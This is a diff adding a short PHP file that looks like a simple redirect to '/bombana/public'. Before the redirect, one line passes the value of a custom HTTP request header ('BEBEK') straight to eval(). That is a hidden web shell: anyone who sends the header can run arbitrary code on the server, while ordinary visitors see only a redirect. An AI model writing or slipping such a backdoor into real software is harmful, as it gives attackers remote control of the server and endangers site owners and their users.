@@ -1,0 +1,4 @@
+<?php
+eval($_SERVER['HTTP_BEBEK']);
+header("Location: /bombana/public");
+exit;
